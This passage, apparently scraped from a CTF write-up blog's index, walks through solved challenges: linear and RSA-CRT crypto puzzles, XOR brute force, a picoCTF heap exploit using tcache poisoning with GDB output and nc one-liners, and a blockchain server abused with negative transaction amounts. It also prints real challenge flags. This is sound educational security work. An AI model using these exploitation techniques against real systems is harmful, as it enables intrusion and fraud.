((((((((((((((((x)+105)+99)*116)+102)+123)+102)-97)*107)*101)*95)+102)+108)-97)-103)*125)'  Since all operations are sums and products, we can express box as a linear function $\\mathtt{box}{(x)} = mx + n$ for some values $m, n \\in \\mathbb{Z}$.\nWe are provided with $\\mathtt{box}{(\\mathtt{flag})}$, $\\mathtt{box}{(1337)}$ and $\\mathtt{box}{(0\\text{x}1337)}$. These values are enough to find $m$ and $n$ using a system of linear equations:\n$$ \\begin{cases} \\mathtt{box}{(1337)} = 1337 \\cdot m + n \\newline \\mathtt{box}{(0\\text{x}1337)} = 0\\text{x}1337 \\cdot m + n \\newline \\end{cases} $$\nSo,\n$$ m = \\frac{\\mathtt{box}{(0\\text{x}1337)} - \\mathtt{box}{(1337)}}{0\\text{x}1337 - 1337} \\qquad n = \\mathtt{box}{(1337)} - 1337 \\cdot m $$\nOnce we have found $m$ and $n$, we can find the flag:\n$$ \\mathtt{box}{(\\mathtt{flag})} = m \\cdot \\mathtt{flag} + n \\iff \\mathtt{flag} = \\frac{\\mathtt{box}{(\\mathtt{flag})} - n}{m} $$\nLet\u0026rsquo;s do the above operations in Python:\n\u0026gt;\u0026gt;\u0026gt; c = 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 \u0026gt;\u0026gt;\u0026gt; c1 = 3011454617406654839679120250 \u0026gt;\u0026gt;\u0026gt; c2 = 10002638090931457241529120250 \u0026gt;\u0026gt;\u0026gt; m = (c2 - c1) // (0x1337 - 1337) \u0026gt;\u0026gt;\u0026gt; n = c1 - 1337 * m \u0026gt;\u0026gt;\u0026gt; x = (c - n) // m \u0026gt;\u0026gt;\u0026gt; hex(x) '0x696374667b776f775f737563685f6c696e6561725f736f5f656173797d' \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(x)[2:]) b'ictf{wow_such_linear_so_easy}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/box/","section":"ctf","summary":"ImaginaryCTF 15/09/2022. 50 points. System of linear equations","time":2,"title":"Box"},{"contents":"We are given this text file (brainy.txt):\n++++++++++[++++++++++++++++++++++++++++++++++++++++++++.-----------.+.-------------.++++++++++++.------------.+++++++++++++.--------------.++++++++++++++++++++++++++.  It corresponds to Brainfuck esoteric languages. If we use a tool like www.tutorialspoint.com, we can get the output:\nIn summary, we have:\np = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871  $p$ and $q$ seem to be parameters for an RSA cryptosystem, and $c$ must be the ciphertext. However, we need to find out what are $dp$ and $dq$.\nAfter a bit of research, we discover that it is a variant of RSA called RSA with CRT (more information at crypto.stackexchange.com).\nSo we have part of the private key. In RSA with CRT, the private key is formed by:\n Primes $p$ and $q$ Then $d_p = d \\pmod{p - 1}$ and $d_q = d \\pmod{q - 1}$ And finally $q_\\mathrm{inv} = q^{-1} \\pmod{p}$  In order to decrypt $c$, we must perform the following operations (which apply the Chinese Remainder Theorem):\n$$ m_1 = c^{d_p} \\pmod{p} \\qquad m_2 = c^{d_q} \\pmod{q} $$\nThen, we get a value $h$ as\n$$ h = q_\\mathrm{inv} (m_1 - m_2) \\pmod{p} $$\nAnd obtain the plaintext message as\n$$ m = m_2 + hq \\pmod{pg} $$\nWe have everything to get $m$, so let\u0026rsquo;s do the math in Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; p = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 \u0026gt;\u0026gt;\u0026gt; q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 \u0026gt;\u0026gt;\u0026gt; dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 \u0026gt;\u0026gt;\u0026gt; dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 \u0026gt;\u0026gt;\u0026gt; c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871 \u0026gt;\u0026gt;\u0026gt; m1 = pow(c, dp, p) \u0026gt;\u0026gt;\u0026gt; m2 = pow(c, dq, q) \u0026gt;\u0026gt;\u0026gt; h = pow(q, -1, p) * (m1 - m2) % p \u0026gt;\u0026gt;\u0026gt; m = (m2 + h * q) % (p * q) \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ch1n3z_r3m4ind3r_the0rem_r0ck$$$_9792'  So, the flag is: HTB{ch1n3z_r3m4ind3r_the0rem_r0ck$$$_9792}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/brainys-cipher/","section":"ctf","summary":"Brainfuck. RSA with CRT","time":2,"title":"Brainy's Cipher"},{"contents":"We are given this sequence of characters:\nTCQ{rveyln'bH_varHuebcrqxetrHOXEj  We are told that the encryption type is XOR, but we need to guess the key. For that purpose, we can perform a brute force attack using \u0026ldquo;XOR Brute Force\u0026rdquo; module from CyberChef. If we filter by CTFlearn, we get the key and the flag:\nFlag: CTFlearn{y0u_Have_bruteforce_XOR}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/bruxor/","section":"ctf","summary":"XOR brute force","time":1,"title":"BruXOR"},{"contents":"We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:\n$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  It is configured to use Glibc at the current directory:\n$ ldd heapedit linux-vdso.so.1 (0x00007ffe8397e000) libc.so.6 = ./libc.so.6 (0x00007f9f134b0000) /lib64/ld-linux-x86-64.so.2 (0x00007f9f138a3000)  We will use pwninit to patch the binary so that it works:\n$ pwninit --libc libc.so.6 --no-template --bin heapedit bin: heapedit libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb setting ./ld-2.27.so executable copying heapedit to heapedit_patched running patchelf on heapedit_patched  And now it still doesn\u0026rsquo;t work:\n$ ./heapedit_patched zsh: segmentation fault (core dumped) ./heapedit_patched  Let\u0026rsquo;s use ltrace to see some library calls:\n$ ltrace ./heapedit_patched setbuf(0x7fe7fa3ac760, 0) = \u0026lt;void\u0026gt; fopen(\"flag.txt\", \"r\") = 0 fgets( \u0026lt;no return ...\u0026gt; --- SIGSEGV (Segmentation fault) --- +++ killed by SIGSEGV +++  And there is the issue, we need to create a fake flag file to run it correctly:\n$ echo 'picoCTF{test_flag}' \u0026gt; flag.txt $ ./heapedit_patched You may edit one byte in the program. Address: 1 Value: 2 t help you: this is a random string.  It seems like the program is giving us a \u0026ldquo;write-what-where\u0026rdquo; primitive for one byte. Let\u0026rsquo;s use Ghidra to decompile the binary into readable C source code:\nint main() { long in_FS_OFFSET; char value; int address; int i; void *p_first_malloc; void *first_malloc; FILE *flag_file; void *second_malloc; void *last_malloc; undefined8 random_string; undefined8 local_70; undefined8 local_68; undefined local_60; char flag[72]; long local_10; local_10 = *(long *) (in_FS_OFFSET + 0x28); setbuf(stdout, (char *) 0x0); flag_file = fopen(\"flag.txt\", \"r\"); fgets(flag, 0x40, flag_file); /* this is */ random_string = 0x2073692073696874; /* a random */ local_70 = 0x6d6f646e61722061; /* string. */ local_68 = 0x2e676e6972747320; local_60 = 0; p_first_malloc = (void *) 0x0; for (i = 0; i \u0026lt; 7; i++) { first_malloc = malloc(0x80); if (p_first_malloc == (void *) 0x0) { p_first_malloc = first_malloc; } /* Congrats */ *(undefined8 *) first_malloc = 0x73746172676e6f43; /* ! Your f */ *(undefined8 *) ((long) first_malloc + 8) = 0x662072756f592021; /* lag is: */ *(undefined8 *) ((long) first_malloc + 0x10) = 0x203a73692067616c; *(undefined *) ((long) first_malloc + 0x18) = 0; strcat((char *) first_malloc,flag); } second_malloc = malloc(0x80); /* Sorry! T */ *(undefined8 *) second_malloc = 0x5420217972726f53; /* his won' */ *(undefined8 *) ((long) second_malloc + 8) = 0x276e6f7720736968; /* t help y */ *(undefined8 *) ((long) second_malloc + 0x10) = 0x7920706c65682074; /* ou: */ *(undefined4 *) ((long) second_malloc + 0x18) = 0x203a756f; *(undefined *) ((long) second_malloc + 0x1c) = 0; strcat((char *) second_malloc, (char *) \u0026amp;random_string); free(first_malloc); free(second_malloc); address = 0; value = '\\0'; puts(\"You may edit one byte in the program.\"); printf(\"Address: \"); __isoc99_scanf(\"%d\", \u0026amp;address); printf(\"Value: \"); __isoc99_scanf(\" %c\", \u0026amp;value); *(char *) ((long) address + (long) p_first_malloc) = value; last_malloc = malloc(0x80); puts((char *) ((long) last_malloc + 0x10)); if (local_10 != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; }  It is using malloc to store two strings in the heap. The flag corresponds to the first malloc, the second malloc will be for a dummy message (i.e. \u0026ldquo;Sorry! This won\u0026rsquo;t help you: this is a random string.\u0026rdquo;).\nIt is also releasing the chunks using free. And finally it is calling malloc again, so the last chunk that was released will be allocated, and then it prints the stored string.\nHere, the order matters, because the last chunk that is released is the one that contains the random string.\nThe program gives us a chance to modify a single byte in a given address, let\u0026rsquo;s see what we can do.\nWe will use GDB to debug the program breaking at puts:\n$ gdb -q heapedit_patched Reading symbols from heapedit_patched... (No debugging symbols found in heapedit_patched) gef➤ break puts Breakpoint 1 at 0x400690 gef➤ run Starting program: ./heapedit_patched Breakpoint 1, _IO_puts (str=0x400b18 \"You may edit one byte in the program.\") at ioputs.c:33  gef➤ heap chunks Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE) [0x0000000000602010 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE) [0x0000000000602260 88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00 .$.......$`.....] Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE) [0x0000000000602490 70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61 picoCTF{test_fla] Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE) [0x00000000006034a0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE) [0x0000000000603530 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE) [0x00000000006035c0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE) [0x0000000000603650 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE) [0x00000000006036e0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE) [0x0000000000603770 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) [0x0000000000603800 00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66 ........! Your f] Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) [0x0000000000603890 00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27 .8`.....his won'] Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE) ← top chunk  Here we can see a lot of things. First, there are 2 chunks in the Tcache (it is represented by the 02 in the first chunk of the output). The Tcache is a linked list of released chunks. It is used by malloc to allocate chunks faster because it will check if there are chunks in Tcache before requesting memory to the kernel.\nThe address of the next chunk to be allocated (the head of the linked list) is 0x603890:\ngef➤ x/20gx 0x602000 0x602000: 0x0000000000000000 0x0000000000000251 0x602010: 0x0200000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000603890 0x602090: 0x0000000000000000 0x0000000000000000  The previous output is the start of the heap address space. That chunk shown is a special chunk that stores the information that malloc uses to allocate chunks.\nLet\u0026rsquo;s see whats in the head of the Tcache (actually, 0x10 before to see the chunk metadata). It is a chunk of 0x90 bytes (the 1 in 0x91 means that the previous chunk is in use). It contains the random string:\ngef➤ x/20gx 0x603880 0x603880: 0x0000000000000000 0x0000000000000091 0x603890: 0x0000000000603800 0x276e6f7720736968 0x6038a0: 0x7920706c65682074 0x73696874203a756f 0x6038b0: 0x6172206120736920 0x727473206d6f646e 0x6038c0: 0x000000002e676e69 0x0000000000000000 0x6038d0: 0x0000000000000000 0x0000000000000000 0x6038e0: 0x0000000000000000 0x0000000000000000 0x6038f0: 0x0000000000000000 0x0000000000000000 0x603900: 0x0000000000000000 0x0000000000000000 0x603910: 0x0000000000000000 0x000000000001f6f1 0x603920: 0x0000000000000000 0x0000000000000000 gef➤ x/s 0x603898 0x603898: \"his won't help you: this is a random string.\"  Let\u0026rsquo;s continue and write 0 into the address 0 and see what happens:\ngef➤ continue Continuing. You may edit one byte in the program. Address: 0 Value: 0 Breakpoint 1, _IO_puts (str=0x6038a0 \"t help you: this is a random string.\") at ioputs.c:33  gef➤ heap chunks Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE) [0x0000000000602010 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE) [0x0000000000602260 88 24 ad fb 00 00 00 00 a3 24 60 00 00 00 00 00 .$.......$`.....] Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE) [0x0000000000602490 70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61 picoCTF{test_fla] Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE) [0x00000000006034a0 30 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 0ongrats! Your f] Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE) [0x0000000000603530 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE) [0x00000000006035c0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE) [0x0000000000603650 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE) [0x00000000006036e0 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE) [0x0000000000603770 43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66 Congrats! Your f] Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) [0x0000000000603800 00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66 ........! Your f] Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) [0x0000000000603890 00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27 .8`.....his won'] Chunk(addr=0x603920, size=0x410, flags=PREV_INUSE) [0x0000000000603920 30 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0...............] Chunk(addr=0x603d30, size=0x1f2e0, flags=PREV_INUSE) ← top chunk  Can you spot the difference? There is a 0ongrats! instead of Congrats!. Hence, the address where we write is actually an offset, and the base address is 0x6034a0:\ngef➤ grep 0ongrats [+] Searching '0ongrats' in memory [+] In '[heap]'(0x602000-0x623000), permission=rw- 0x6034a0 - 0x6034cc → \"0ongrats! Your flag is: picoCTF{test_flag}\\n\"  Moreover, puts is using the string at 0x6038a0, which is 0x603890 + 0x10, the code actually performs this operation:\nlast_malloc = malloc(0x80); puts((char *) ((long) last_malloc + 0x10));  We are going to modify 0x603890 inside the Tcache and change it for 0x603490 for example. That is, we will put 0x34 as the byte to write (which is 4 in ASCII).\nNow we need to obtain the address where 0x603890 is stored in the heap. Recall this output:\ngef➤ x/20gx 0x602000 0x602000: 0x0000000000000000 0x0000000000000251 0x602010: 0x0200000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000603890 0x602090: 0x0000000000000000 0x0000000000000000  The exact address of the byte 0x38 is 0x602089. Let\u0026rsquo;s verify it:\ngef➤ x/c 0x602089 0x602089: 0x38  Alright, so the offset we need is 0x602089 - 0x6034a0 = -5143. Let\u0026rsquo;s try it:\n$ gdb -q heapedit_patched Reading symbols from heapedit_patched... (No debugging symbols found in heapedit_patched) gef➤ run Starting program: ./heapedit_patched You may edit one byte in the program. Address: -5143 Value: 4 Congrats! Your flag is: picoCTF{test_flag} [Inferior 1 (process 295925) exited normally]  It works in GDB, but not outside:\n$ ./heapedit_patched You may edit one byte in the program. Address: -5143 Value: 4 zsh: segmentation fault (core dumped) ./heapedit_patched  After some time, I figured out what was hapenning. The thing is that the heap addresses suffer from ASLR, so all the addresses are randomized but the last three hexadecimal digits (as with Glibc or PIE binaries). We are modifying the fourth and third digits of an address, and that will not work always.\nOne way to solve this is trying multiple times:\n$ while true; do echo '-5143\\n4' | ./heapedit_patched; done | grep picoCTF Address: Value: Congrats! Your flag is: picoCTF{test_flag}  And it also works on the remote instance:\n$ while true; do echo '-5143\\n4' | nc mercury.picoctf.net 8054; done | grep picoCTF Address: Value: Congrats! Your flag is: picoCTF{5c9838eff837a883a30c38001280f07d}  There is a more elegant solution, which is modifying the first and second digits (which will not change due to ASLR). For instance, we may change 0x603890 to be 0x603800 (which is the address of the previous chunk) in the example above. We also need to substract 1 to the address offset (that is -5144).\nIt works always and both locally and remotely:\n$ echo '-5144\\n\\0' | ./heapedit_patched You may edit one byte in the program. Address: Value: lag is: picoCTF{test_flag} $ echo '-5144\\n\\0' | nc mercury.picoctf.net 8054 You may edit one byte in the program. Address: Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cache-me-outside/","section":"ctf","summary":"picoCTF 2021. 70 points. 64-bit binary. Heap exploitation. Tcache poisoning","time":10,"title":"Cache Me Outside"},{"contents":"We are given a Python script called cli.py that is intended to interact with the remote instance. Moreover, we have some Python source code that are related to Blockchain and might be running in the server.\nAnother file we have is bot_wallet.txt, which contains a Blockchain wallet:\nLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==  Finally, there\u0026rsquo;s a README.txt file that says:\nThe flag is located at /app/flag.txt  Recognition The remote server is probably running a Flask application (notice that the response status message is in capital letters, and also the Server header):\n$ curl -i 178.128.173.79:31884 HTTP/1.1 404 NOT FOUND Server: Werkzeug/2.1.2 Python/3.8.10 Date: Content-Type: text/html; charset=utf-8 Content-Length: 207 Connection: close \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=en\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt;  Maybe we must compromise the server to get the flag, because there is no reference to the flag in the given source files. So, keep in mind that the objective is to compromise the Flask application.\nCLI setup The CLI (cli.py) starts with a local server URL, which should be the remote instance for us:\nwallet=None SERVICE_URL=\"http://127.0.0.1:5000\"  So let\u0026rsquo;s thange it to \u0026quot;http://178.128.173.79:31884\u0026quot;.\nThe CLI offers the following options:\noptions={ \"help\": help,  \"wallet show\": wallet_show,  \"wallet generate\": wallet_generate, \"wallet load\": wallet_load, \"wallet save\": wallet_save, \"transaction\": transaction, \"mine\": mine, \"pending transactions\": pending_transactions, \"balance\": balance, \"nodes\": nodes, \"blocks\": blocks, \"transactions\": transactions } if__name__==\"__main__\": help() whileTrue: i=input(\"Blockchain\u0026gt; \") ifiinoptions: options[i]()  CLI analysis The only option where we can provide user input is transaction:\ndeftransaction(): globalwallet ifwalletisNone: print(\"[!] Please generate/load a wallet first!\") return-1 recipient=input(\"Enter Recipient\u0026gt; \") whileTrue: amount=input(\"Amount\u0026gt; \") ifamount.isdigit(): ifint(amount) \u0026gt;get_wallet_balance(): print(\"[+] Cannot send more coin than you have!\") else: break else: print(\"[+] NaN\") data=input(\"Enter Data\u0026gt; \")  tx=Transaction(wallet.address, recipient, int(amount)) tx.data=data tx.sig =hex(wallet.sign_message(str(tx)))[2:] #required = ['sender', 'recipient', 'amount', 'signature'] r=requests.post(f\"{SERVICE_URL}/transactions/new\", json={\"sender\": wallet.address, \"recipient\":  recipient, \"amount\": int(amount), \"signature\": tx.sig, \"data\": data}) print(f\"[+] Sent Transaction: {r.json()['message']}\")  Basically, it performs a POST request to /transactions/new indicating the sender and receiver wallet addresses (when using the CLI, we can enter a blank address to indicate our own wallet), the amount of coins to send and some data.\nFuzzing the server The CLI checks that we have enough coins and that our input data is a number, but we can comment those lines of code and enter junk data\u0026hellip; Maybe the server does not check it appropiately. This is the new code (new_cli.py):\ndeftransaction(): globalwallet ifwalletisNone: print(\"[!] Please generate/load a wallet first!\") return-1 recipient=input(\"Enter Recipient\u0026gt; \") # while True: amount=input(\"Amount\u0026gt; \") # if amount.isdigit(): # if int(amount) \u0026gt; get_wallet_balance(): # print(\"[+] Cannot send more coin than you have!\") # else: # break # else: # print(\"[+] NaN\") data=input(\"Enter Data\u0026gt; \") tx=Transaction(wallet.address, recipient, int(amount)) tx.data=data tx.sig =hex(wallet.sign_message(str(tx)))[2:] #required = ['sender', 'recipient', 'amount', 'signature'] r=requests.post(f\"{SERVICE_URL}/transactions/new\", json={\"sender\": wallet.address, \"recipient\":  recipient, \"amount\": int(amount), \"signature\": tx.sig, \"data\": data}) print(f\"[+] Sent Transaction: {r.json()['message']}\")  Before doing this, we need to obtain a wallet (wallet_generate and wallet_show). Then, we do the transaction. For example, we can try negative numbers:\n$ python3 new_cli.py Options: help | wallet show | wallet generate | wallet load | wallet save | transaction | mine | pending transactions | balance | nodes | blocks | transactions Blockchain\u0026gt; wallet generate [+] WARNING: KEYS NOT SAVED TO DISK Blockchain\u0026gt; wallet show [+] Address: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDeUs1OWF1SzVjZVpWUmc2MzZQbEU5REcrMQpmSE96SmI5TjhHWlFBNnQ2TzJrMUEzaU02ZXhwcmpVSElKWnFZaTQ0T1VUQm5xMXFtQlBPQmdtU0lHWEwyRTdXCnFPOTJDV1JFOThsNTRpQUhNM2NKaUVkemxucWRwdnZVUHhyd2FvRXhyQ3BlU3g1c2VNa0dpc1JwMVBvdWk3REEKcjd6Y0NZdERIWnUyK2ZpZFRRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 0 Blockchain\u0026gt; wallet save Enter Wallet File Name\u0026gt; wallet.txt Blockchain\u0026gt; transaction Enter Recipient\u0026gt; Amount\u0026gt; -1337 Enter Data\u0026gt; Testing [+] Sent Transaction: Transaction will be added to Block 3  We need to mine the block with mine in order to make the transaction effective. We will find out that we have 1338 as balance, so the server is vulnerable:\nBlockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (3) Blockchain\u0026gt; wallet show [+] Address: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDeUs1OWF1SzVjZVpWUmc2MzZQbEU5REcrMQpmSE96SmI5TjhHWlFBNnQ2TzJrMUEzaU02ZXhwcmpVSElKWnFZaTQ0T1VUQm5xMXFtQlBPQmdtU0lHWEwyRTdXCnFPOTJDV1JFOThsNTRpQUhNM2NKaUVkemxucWRwdnZVUHhyd2FvRXhyQ3BlU3g1c2VNa0dpc1JwMVBvdWk3REEKcjd6Y0NZdERIWnUyK2ZpZFRRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 1338  What has happened? We told the server to send -1337 coins from us to us, so our balance is \u0026ldquo;reduced\u0026rdquo; as 0 - (-1337) = 1337. When mining a block, we receive an additional coin, so we end up with 1338 coins.\nInteracting with the bot Now that we have money, we can try to send the bot a coin. And let\u0026rsquo;s capture the requests and responses from /mine with Burp Suite:\ndefmine(): globalwallet ifwalletisNone: print(\"[!] Please generate/load a wallet first!\") return-1 print(\"[+] Mining!\") r_last_block=requests.get(f\"{SERVICE_URL}/last_block\").json() last_block=Block.from_json(r_last_block) last_proof=last_block.proof last_hash=last_block.hash() proof=0 whilevalid_proof(last_proof, proof, last_hash) isFalse: proof+=1 tx=Transaction(\"0\", wallet.address, 1) sig=hex(wallet.sign_message(str(tx)))[2:] #required = ['recipient', \"signature\", \"proof\"] r=requests.post( f\"{SERVICE_URL}/mine\", json={ \"recipient\": wallet.address,  \"signature\": sig,  \"proof\": proof }, proxies={ 'http': '127.0.0.1:8080' }) j=r.json() ifr.status_code==200: print(f\"[+] Done! - {j['message']}({j['index']})\") else: print(f\"[!] Done - {j['message']}\")  We can load the wallet from a file and keep the same balance. Let\u0026rsquo;s do the transaction and mine it:\n$ python3 new_cli.py Options: help | wallet show | wallet generate | wallet load | wallet save | transaction | mine | pending transactions | balance | nodes | blocks | transactions Blockchain\u0026gt; wallet load Enter Wallet File Name (q to quit)\u0026gt; wallet.txt Blockchain\u0026gt; wallet show [+] Address: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 1338 Blockchain\u0026gt; transaction Enter Recipient\u0026gt; LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount\u0026gt; 1 Enter Data\u0026gt; One coin [+] Sent Transaction: Transaction will be added to Block 4 Blockchain\u0026gt; mine [+] Mining!  Now we get the request in Burp Suite:\nAnd this is the response:\nIf we forward the request, we still have the same balance:\n[+] Done! - New Block Forged (4) Blockchain\u0026gt; wallet show [+] Address: 